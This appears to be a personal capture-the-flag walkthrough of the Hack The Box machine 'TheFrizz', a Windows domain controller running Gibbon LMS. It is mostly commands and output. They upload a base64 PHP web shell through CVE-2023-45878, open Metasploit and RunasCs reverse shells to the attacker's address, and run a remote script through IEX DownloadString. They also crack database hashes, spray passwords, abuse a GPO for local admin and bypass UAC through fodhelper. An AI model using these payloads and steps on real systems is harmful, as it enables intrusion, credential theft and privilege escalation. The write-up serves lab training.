# User flag
## 1. rustscan
```python
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ rustscan -a 10.129.206.151 -- -sC -sV -oN TheFrizz

# Nmap 7.94SVN scan initiated Mon Mar 17 08:19:04 2025 as: /usr/lib/nmap/nmap --privileged -vvv -p 22,53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49664,49667,49670,50852,50861 -sC -sV -oN TheFrizz 10.129.206.151
Nmap scan report for frizzdc.frizz.htb (10.129.206.151)
Host is up, received echo-reply ttl 127 (0.22s latency).
Scanned at 2025-03-17 08:19:05 EDT for 105s
PORT      STATE SERVICE       REASON          VERSION
22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Education &mdash; Walkerville Elementary School
|_Requested resource was http://frizzdc.frizz.htb/home/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-18 00:19:22Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
50852/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
50861/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
50887/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40871/tcp): CLEAN (Timeout)
|   Check 2 (port 40193/tcp): CLEAN (Timeout)
|   Check 3 (port 27776/udp): CLEAN (Timeout)
|   Check 4 (port 27559/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-03-18T00:20:23
|_  start_date: N/A
|_clock-skew: 6h59m58s
```

## 2. enum4linux
```
┌──(kali㉿kali)-[~]
└─$ enum4linux 10.129.206.151 

=> no null session
```

## 3. Check website
* CVE: https://www.exploit-db.com/exploits/51903
* CVE: https://nvd.nist.gov/vuln/detail/CVE-2023-45878
```python
# http://frizzdc.frizz.htb/Gibbon-LMS/
 Powered by Gibbon v25.0.00 | © Ross Parker 2010-2025

* weird thing on website*

┌──(kali㉿kali)-[~/Desktop/htb]
└─$ base64 -d hash.txt      
Want to learn hacking but don't want to go to jail? You'll learn the in's and outs of Syscalls and XSS from the safety of international waters and iron clad contracts from your customers, reviewed by Walkerville's finest attorneys.



# use upload CVE
┌──(kali㉿kali)-[~/Desktop/htb/test]
└─$ curl -X POST "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php" \
  -H "Host: frizzdc.frizz.htb" \
  --data-urlencode "img=image/png;asdf,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=" \
  --data-urlencode "path=shell.php" \
  --data-urlencode "gibbonPersonID=0000000001"

# get web shell
=> http://frizzdc.frizz.htb/Gibbon-LMS/shell.php?cmd=dir
```

## 4. get shell with msf
```python
┌──(kali㉿kali)-[~/Desktop/htb/test]
└─$ msfconsole -q       
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
[*] Starting persistent handler(s)...
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set target 2
target => 2
msf6 exploit(multi/script/web_delivery) > set lhost 10.10.14.18
lhost => 10.10.14.18
msf6 exploit(multi/script/web_delivery) > set lport 4444
lport => 4444
msf6 exploit(multi/script/web_delivery) > run
```
## 5. mysql portfwd
```python
┌──(kali㉿kali)-[~/Tools/scripts]
└─$ ./chisel_1.7.7 server -p 8888 --reverse                 
2025/03/17 12:40:36 server: Reverse tunnelling enabled
2025/03/17 12:40:36 server: Fingerprint wp5cw9AuM+qgWYkVslZmf/28cpZRK4Xomb9OtNHLOFY=
2025/03/17 12:40:36 server: Listening on http://0.0.0.0:8888
2025/03/17 12:41:20 server: session#1: tun: proxy#R:127.0.0.1:3306=>3306: Listening

PS C:\xampp\htdocs\Gibbon-LMS> ./chisel.exe client 10.10.14.18:8888 R:127.0.0.1:3306:127.0.0.1:3306
./chisel.exe client 10.10.14.18:8888 R:127.0.0.1:3306:127.0.0.1:3306
2025/03/17 16:41:17 client: Connecting to ws://10.10.14.18:8888
2025/03/17 16:41:19 client: Connected (Latency 239.1724ms)


┌──(kali㉿kali)-[~/Desktop/htb]
└─$ mysql -u "MrGibbonsDB" -pMisterGibbs\!Parrot\!\?1 -h 127.0.0.1 --ssl-verify-server-cert=false


MariaDB [gibbon]> select username,passwordStrong,passwordStrongSalt,email from gibbonperson ;
+-----------+------------------------------------------------------------------+------------------------+---------------------+
| username  | passwordStrong                                                   | passwordStrongSalt     | email               |
+-----------+------------------------------------------------------------------+------------------------+---------------------+
| f.frizzle | 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03 | /aACFhikmNopqrRTVz2489 | f.frizzle@frizz.htb |
+-----------+------------------------------------------------------------------+------------------------+---------------------+

# hashcat crack
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23
```


## 6. ps-remote session 

```python
C:\xampp\htdocs\Gibbon-LMS>powershell
PS C:\xampp\htdocs\Gibbon-LMS> $password = ConvertTo-SecureString "Jenni_Luvs_Magic23" -AsPlainText -Force
$password = ConvertTo-SecureString "Jenni_Luvs_Magic23" -AsPlainText -Force
PS C:\xampp\htdocs\Gibbon-LMS> $Cred = New-Object System.Management.Automation.PSCredential ("f.frizzle",$password) 
$Cred = New-Object System.Management.Automation.PSCredential ("f.frizzle",$password)
PS C:\xampp\htdocs\Gibbon-LMS> $sess = New-PSSession -ComputerName frizzdc -Credential $Cred
$sess = New-PSSession -ComputerName frizzdc -Credential $Cred
PS C:\xampp\htdocs\Gibbon-LMS> Enter-PSSession $sess
```

# Root flag
## 1. try exploit suggester
```python
meterpreter > run post/multi/recon/local_exploit_suggester

1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2016+ Build 20348                                                
 4   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default                         
 6   exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2016+ Build 20348                                                                                          
 7   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.

```

## 2. User info
```python
C:\>whoami /all
whoami /all

USER INFORMATION
----------------

User Name          SID                                           
================== ==============================================
frizz\w.webservice S-1-5-21-2386970044-1145388522-2932701813-1120


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

## 3. Winpeas.exe
```python
Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
```

## 4. password spraying
```python
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ nxc ldap 10.129.206.151 -u userlist -p 'Jenni_Luvs_Magic23' -k  --trusted-for-delegation

LDAP        10.129.206.151  389    frizzdc.frizz.htb [*]  x64 (name:frizzdc.frizz.htb) (domain:frizz.htb) (signing:True) (SMBv1:False)
LDAP        10.129.206.151  389    frizzdc.frizz.htb [-] frizz.htb\w.li:Jenni_Luvs_Magic23 KDC_ERR_PREAUTH_FAILED
LDAP        10.129.206.151  389    frizzdc.frizz.htb [-] frizz.htb\h.arm:Jenni_Luvs_Magic23 KDC_ERR_PREAUTH_FAILED
LDAP        10.129.206.151  389    frizzdc.frizz.htb [-] frizz.htb\M.SchoolBus:Jenni_Luvs_Magic23 KDC_ERR_PREAUTH_FAILED
LDAP        10.129.206.151  389    frizzdc.frizz.htb [-] frizz.htb\d.hudson:Jenni_Luvs_Magic23 KDC_ERR_PREAUTH_FAILED
LDAP        10.129.206.151  389    frizzdc.frizz.htb [-] frizz.htb\k.franklin:Jenni_Luvs_Magic23 KDC_ERR_PREAUTH_FAILED
LDAP        10.129.206.151  389    frizzdc.frizz.htb [-] frizz.htb\l.awesome:Jenni_Luvs_Magic23 KDC_ERR_PREAUTH_FAILED
LDAP        10.129.206.151  389    frizzdc.frizz.htb [-] frizz.htb\t.wright:Jenni_Luvs_Magic23 KDC_ERR_PREAUTH_FAILED
LDAP        10.129.206.151  389    frizzdc.frizz.htb [-] frizz.htb\r.tennelli:Jenni_Luvs_Magic23 KDC_ERR_PREAUTH_FAILED
LDAP        10.129.206.151  389    frizzdc.frizz.htb [-] frizz.htb\J.perlstein:Jenni_Luvs_Magic23 KDC_ERR_PREAUTH_FAILED
LDAP        10.129.206.151  389    frizzdc.frizz.htb [-] frizz.htb\a.perlstein:Jenni_Luvs_Magic23 KDC_ERR_PREAUTH_FAILED
LDAP        10.129.206.151  389    frizzdc.frizz.htb [-] frizz.htb\p.terese:Jenni_Luvs_Magic23 KDC_ERR_PREAUTH_FAILED
LDAP        10.129.206.151  389    frizzdc.frizz.htb [-] frizz.htb\v.frizzle:Jenni_Luvs_Magic23 KDC_ERR_PREAUTH_FAILED
LDAP        10.129.206.151  389    frizzdc.frizz.htb [-] frizz.htb\g.frizzle:Jenni_Luvs_Magic23 KDC_ERR_PREAUTH_FAILED
LDAP        10.129.206.151  389    frizzdc.frizz.htb [-] frizz.htb\c.sandiego:Jenni_Luvs_Magic23 KDC_ERR_PREAUTH_FAILED
LDAP        10.129.206.151  389    frizzdc.frizz.htb [-] frizz.htb\c.ramon:Jenni_Luvs_Magic23 KDC_ERR_PREAUTH_FAILED
LDAP        10.129.206.151  389    frizzdc.frizz.htb [-] frizz.htb\m.ramon:Jenni_Luvs_Magic23 KDC_ERR_PREAUTH_FAILED
LDAP        10.129.206.151  389    frizzdc.frizz.htb [-] frizz.htb\w.Webservice:Jenni_Luvs_Magic23 KDC_ERR_PREAUTH_FAILED
LDAP        10.129.206.151  389    frizzdc.frizz.htb [-] frizz.htb\:Jenni_Luvs_Magic23 invalid principal syntax
```

## 5. check Recycle Bin
```python
c:\>dir C:\$Recycle.Bin /s /b
dir C:\$Recycle.Bin /s /b
C:\$Recycle.Bin\S-1-5-21-2386970044-1145388522-2932701813-1103\$IE2XMEG.7z
C:\$Recycle.Bin\S-1-5-21-2386970044-1145388522-2932701813-1103\$RE2XMEG.7z

# upload server to get files for analysis
IIIhtbacademy@htb[/htb]$ pip3 install uploadserver PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') 
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

## 6. wapt
```python
┌──(kali㉿kali)-[~/Desktop/htb/http/wapt]
└─$ find . -name "*.ini*"
./lib/site-packages/bin/wmitest.master.ini
./wapt-get.ini.tmpl
./conf/waptserver.ini.template
./conf/waptserver.ini
./wapt-get.ini


┌──(kali㉿kali)-[~/…/htb/http/wapt/conf]
└─$ cat waptserver.ini                                                 
[options]
allow_unauthenticated_registration = True
wads_enable = True
login_on_wads = True
waptwua_enable = True
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem
clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.crt

[tftpserver]
root_dir = c:\wapt\waptserver\repository\wads\pxe
log_path = c:\wapt\log
```

## 7. Get-PSSession of `M.SchoolBus`
```python
PS C:\Users\f.frizzle\Documents> $password = ConvertTo-SecureString "!suBcig@MehTed!R" -AsPlainText -Force
PS C:\Users\f.frizzle\Documents> $Cred = New-Object System.Management.Automation.PSCredential ("m.schoolbus",$password)
PS C:\Users\f.frizzle\Documents> $sess = New-PSSession -ComputerName frizzdc -Credential $Cred
Enter-PSSession $sess
$sess = New-PSSession -ComputerName frizzdc -Credential $Cred
PS C:\Users\f.frizzle\Documents> Enter-PSSession $sess
[frizzdc]: PS C:\Users\M.SchoolBus\Documents>
```

## 8. Attack GPO path
```bash
# bloodhound
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ nxc ldap 10.129.206.151 -u 'M.SchoolBus' -p '!suBcig@MehTed!R' -k --bloodhound --collection All --dns-server 10.129.206.151
```

![[Pasted image 20250318161108.png]]

## 9. user info
```python
C:\Users\M.SchoolBus\Documents>whoami /groups
whoami /groups
<SNIP>
frizz\Group Policy Creator Owners            Group            S-1-5-21-2386970044-1145388522-2932701813-520  Mandatory group, Enabled by default, Enabled group             
<SNIP>

# User can link gpo
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | where { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, @{Name='ResolvedSID';Expression={ConvertFrom-SID $_.SecurityIdentifier}} | Format-List

ObjectDN    : OU=Domain Controllers,DC=frizz,DC=htb
ResolvedSID : frizz\M.SchoolBus

ObjectDN    : OU=Class_Frizz,DC=frizz,DC=htb
ResolvedSID : frizz\M.SchoolBus

```
## 10. GPO attack

```bash
# create a new GPO
PS C:\Users\M.SchoolBus\Documents> New-GPO -Name TestGPO -Comment "This is a test GPO."
New-GPO -Name TestGPO -Comment "This is a test GPO."


DisplayName      : TestGPO
DomainName       : frizz.htb
Owner            : frizz\M.SchoolBus
Id               : 2e4c2f18-bbd1-4481-85cb-bdf024363cf4
GpoStatus        : AllSettingsEnabled
Description      : This is a test GPO.
CreationTime     : 3/18/2025 8:44:20 AM
ModificationTime : 3/18/2025 8:44:21 AM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :

# make sure the New GPO exist
PS C:\Users\M.SchoolBus\Documents> Get-DomainGPO

usncreated              : 160612
displayname             : TestGPO
whenchanged             : 3/18/2025 3:44:21 PM
objectclass             : {top, container, groupPolicyContainer}
gpcfunctionalityversion : 2
showinadvancedviewonly  : True
usnchanged              : 160617
dscorepropagationdata   : 1/1/1601 12:00:00 AM
name                    : {2E4C2F18-BBD1-4481-85CB-BDF024363CF4}
flags                   : 0
cn                      : {2E4C2F18-BBD1-4481-85CB-BDF024363CF4}
gpcfilesyspath          : \\frizz.htb\SysVol\frizz.htb\Policies\{2E4C2F18-BBD1-4481-85CB-BDF024363CF4}
distinguishedname       : CN={2E4C2F18-BBD1-4481-85CB-BDF024363CF4},CN=Policies,CN=System,DC=frizz,DC=htb
whencreated             : 3/18/2025 3:44:20 PM
versionnumber           : 0
instancetype            : 4
objectguid              : ef78160b-0d66-466f-aec7-e3111ea2fd48
objectcategory          : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=frizz,DC=htb

# Link to OU
PS C:\Users\M.SchoolBus\Documents> New-GPLink -Name TestGPO -Target "OU=Class_Frizz,DC=frizz,DC=htb"

# Check the link
PS C:\Users\M.SchoolBus\Documents> Get-DomainOU | select name, gplink
Get-DomainOU | select name, gplink

name               gplink                                                                                    
----               ------                                                                                    
Domain Controllers [LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=frizz,DC=htb;0]
Class_Frizz        [LDAP://cn={2AB9972D-0C69-4FF9-9B56-0EBF9C27F0FA},cn=policies,cn=system,DC=frizz,DC=htb;0]


# OR
New-GPO -Name HTB -Comment "HTB"
New-GPLink -Name HTB -Target "OU=Domain Controllers,DC=frizz,DC=htb"
./sharp.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName "HTB" --force
Get-DomainOU | select name,gplink
gpupdate /force
```

## 11. Check result

```python
C:\Users\M.SchoolBus\Documents>net user M.SchoolBus
net user M.SchoolBus
User name                    M.SchoolBus
Full Name                    Marvin SchoolBus
Comment                      Desktop Administrator
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/29/2024 7:27:03 AM
Password expires             Never
Password changeable          10/29/2024 7:27:03 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   3/18/2025 9:01:07 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Domain Users         *Desktop Admins       
The command completed successfully.
```

# 12. UAC bypass

```python
# open a new reverse session and find out we are in Medium Mandatory Level
C:\Users>whoami /groups
<SNIP>
frizz\Denied RODC Password Replication Group Alias            S-1-5-21-2386970044-1145388522-2932701813-572  Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level       Label            S-1-16-8192
<SNIP>


# UAC bypass
PS C:\Users\M.SchoolBus\Documents> wget http://10.10.14.38:443/RunasCs.exe -Outfile r.exe
PS C:\Users\M.SchoolBus\Documents> .\r.exe "M.SchoolBus" '!suBcig@MehTed!R' powershell.exe -r 10.10.14.38:9001

# get high level session
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ nc -lvnp 9001         
listening on [any] 9001 ...
connect to [10.10.14.38] from (UNKNOWN) [10.129.206.151] 62004
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32>

```

# Note

1. UAC bypass: 
```
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe -e ..." -Force New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force c:\Windows\System32\fodhelper.exe
```

2. New tool:
   https://github.com/antonioCoco/RunasCs/releases/tag/v1.5
3. UAC bypass list:
	[https://github.com/FatRodzianko/SharpBypassUAC](https://github.com/FatRodzianko/SharpBypassUAC "https://github.com/FatRodzianko/SharpBypassUAC")
